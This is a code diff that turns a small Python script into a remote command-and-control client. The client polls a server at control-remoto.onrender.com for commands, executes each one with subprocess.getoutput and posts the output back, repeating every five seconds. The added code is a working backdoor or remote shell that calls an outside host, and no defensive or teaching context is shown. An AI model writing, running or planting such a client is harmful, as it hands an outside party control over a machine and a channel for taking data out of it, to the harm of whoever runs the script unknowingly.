@@ -1,13 +1,18 @@
-import requests
-import time
+import requests, subprocess, time
 
-URL = "https://control-remoto.onrender.com/comando"
+SERVER  = "https://control-remoto.onrender.com"
+ID      = "cliente1"
 
 while True:
     try:
-        data = {"comando": "whoami"}
-        r = requests.post(URL, json=data, timeout=10)
-        print("[+] Respuesta:", r.json())
+        # ─── 1) recoge comando ─────────────────────────────────────────────
+        cmd = requests.get(f"{SERVER}/cmd/{ID}", timeout=10).text.strip()
+        if cmd:
+            print(f"[>] Ejecutando: {cmd}")
+            salida = subprocess.getoutput(cmd)
+
+            # ─── 2) envía resultado ───────────────────────────────────────
+            requests.post(f"{SERVER}/out/{ID}", data=salida.encode(), timeout=10)
     except Exception as e:
-        print("[!] Error al obtener comando:", e)
+        print("[!] Error:", e)
     time.sleep(5)
